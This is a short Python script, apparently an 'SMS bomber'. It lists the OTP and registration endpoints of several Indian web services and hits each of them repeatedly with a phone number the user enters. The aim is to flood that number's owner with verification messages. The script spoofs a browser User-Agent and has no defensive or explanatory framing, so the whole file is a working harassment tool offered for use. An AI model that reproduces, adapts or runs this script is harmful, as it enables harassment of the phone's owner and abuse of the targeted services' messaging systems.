import requests
import platform
import time

url = ["https://securedapi.confirmtkt.com/api/platform/register?mobileNumber=","https://m.naaptol.com/faces/jsp/ajax/ajax.jsp?actionname=checkMobileUserExists&mobile=","http://t.justdial.com/api/india_api_write/10aug2016/sendvcode.php?mobile=","https://www.oyorooms.com/api/pwa/generateotp?phone=","https://students.byjus.com/mobiles/request_otp?mobile=%2B91-"]

header = {'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36'}

def bomb(num):
	for x in url:
		upd = str(x) + str(num)
		print(upd)
		requests.get(upd, headers = header)

count = int(input("Times : "))
phone = input("Number : ")
for i in range(1,count):
	bomb(phone)